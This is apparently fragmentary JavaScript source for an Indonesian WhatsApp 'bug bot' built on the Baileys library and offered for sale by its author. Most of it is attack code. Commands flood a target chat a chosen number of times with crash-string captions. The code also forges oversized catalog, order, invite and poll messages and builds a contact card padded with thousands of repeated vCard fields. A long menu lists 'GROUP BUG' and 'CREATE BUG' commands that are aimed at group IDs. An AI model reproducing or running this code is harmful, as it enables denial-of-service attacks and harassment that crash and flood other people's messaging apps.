...
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT Anggazyy Silently",
"options": [
{
...
{
"optionName": "SALAM BROTHER BY Anggazyy Silently"
}
],
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭2': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone1}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭3': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone2}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭4': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone3}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭5': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone4}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭6': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone5}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭7': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${iphone6}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭8': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${buttonkal}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭9': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${buttonvirus}` }, { quoted: doc })
}
}
break
case '╠➤ 𝐯𝐢𝐫𝐭𝐞𝐱𝐭10': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `Anggazyy Silently ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
...
"mimetype": "image/jpeg",
"caption": `© Anggazyy Silently${ngazap(prefix)}`,
...
"title": `© Anggazyy Silently${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
...
"description": "Developer Anggazyy Silently\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© Anggazyy Silently${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
"inviteExpiration": `MY NAME Anggazyy Silently${ngazap(prefix)}`,
"groupName": `MY NAME Anggazyy Silently${ngazap(prefix)}`,
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Anggazyy Silently${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© Anggazyy Silently${ngazap(prefix)}`,
...
"title": `© Anggazyy Silently${ngazap(prefix)}`,
"description": `© Anggazyy Silently`,
"currencyCode": "IDR",
"footerText": `© Anggazyy Silently`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© Anggazyy Silently WE ARE NOT MASTOD`,
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `Anggazyy Silently ${ngazap(prefix)}.BIN`, title: `Anggazyy Silently ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
...
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Anggazyy Silently${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Anggazyy Silently\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
◎ 𝐎𝐰𝐧𝐞𝐫 : 𝐀𝐧𝐠𝐠𝐚𝐳𝐲𝐲
◎ 𝐏𝐚𝐧𝐞𝐥 : panel.anggazyy.me
◎ 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 : 𝐌𝐨𝐧𝐠𝐠𝐨𝐃𝐁
◎ 𝐋𝐢𝐛 : 𝐁𝐚𝐢𝐥𝐞𝐲𝐬
◎ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
◎ 𝐋𝐢𝐯𝐞 𝐑𝐮𝐧 : panel.anggazyy.me
◎ 𝐎𝐰𝐧𝐞𝐫 𝐍𝐮𝐦𝐛 : wa.me/62882021734861
...
╔════[ 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆 ]═══════⊱
╠➤ > 𝐦.𝐜𝐡𝐚𝐭
╠➤ 𝐩𝐚𝐲𝐦𝐞𝐧𝐭𝐠𝐜 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐛𝐮𝐭𝐭𝐨𝐧𝐠𝐜 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐛𝐮𝐭𝐭𝐨𝐧𝐯𝐞𝐧𝐨𝐦𝐠𝐜 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐛𝐫𝐨𝐠𝐜  [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐚𝐦𝐩𝐚𝐬𝟐 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐬𝐚𝐧𝐭𝐞𝐭𝐠𝐜 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╠➤ 𝐜𝐚𝐭𝐚𝐥𝐨𝐠𝐠𝐜 [ 𝐦𝐚𝐬𝐮𝐤𝐚𝐧 𝐢𝐝 𝐠𝐫𝐨𝐮𝐩 ]
╚════[ 𝕬𝖓𝖌𝖌𝖆 𝕾𝖆𝖙𝖆𝖓𝖎𝖈 ]══════

╔════[ 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐔𝐆 ]═══════⊱
╠➤ 𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟏 [ 𝐑𝐞𝐩𝐥𝐲 𝐯𝐢𝐝𝐞𝐨 𝐣𝐚𝐝𝐢 𝐛𝐮𝐠 𝐚𝐮𝐝𝐢𝐨 ]
╠➤ 𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟐 [ 𝐑𝐞𝐩𝐥𝐲 𝐯𝐢𝐝𝐞𝐨 𝐦𝐞𝐧𝐣𝐚𝐝𝐢 𝐛𝐮𝐠 𝐯𝐢𝐝𝐞𝐨 ]
╠➤ 𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟑 [ 𝐑𝐞𝐩𝐥𝐲 𝐚𝐮𝐝𝐢𝐨 𝐦𝐞𝐧𝐣𝐚𝐝𝐢 𝐯𝐧 ]
╠➤ 𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟒 [ 𝐑𝐞𝐩𝐥𝐲 𝐬𝐭𝐢𝐤𝐜𝐤𝐞r 𝐣𝐚𝐝𝐢 𝐛𝐮𝐠 𝐠𝐚𝐦𝐛𝐚𝐫 ]
╠➤ 𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟓 [ 𝐑𝐞𝐩𝐥𝐲 𝐠𝐚𝐦𝐛𝐚𝐫 𝐣𝐚𝐝𝐢 𝐛𝐮𝐠 𝐨nce ] 
...
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟖  [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐛𝐮𝐭𝐭𝐨𝐧𝟓𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐦𝐞𝐱𝐜𝐫𝐨𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐤𝐢𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐨𝐤𝐞𝐦𝐞𝐱 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
...
╠➤𝐛𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐥𝐢𝐜𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐤𝐚𝐧𝐠𝐛𝐮𝐭𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐯𝐢𝐫𝐭𝐞𝐱𝐭𝐝𝐞𝐥𝐚𝐲 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐬𝐭𝐢𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝐢𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐛𝐮𝐠𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐨𝐤𝐞𝐩 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐛𝐮𝐠𝐢𝐧𝐯𝐢𝐭𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ] 𝐏𝐜
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐡𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐡𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐡𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐡𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐨 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐠𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐩𝐨𝐥𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐚𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐢𝐧𝐢𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐡𝐢𝐲𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐝𝐨𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
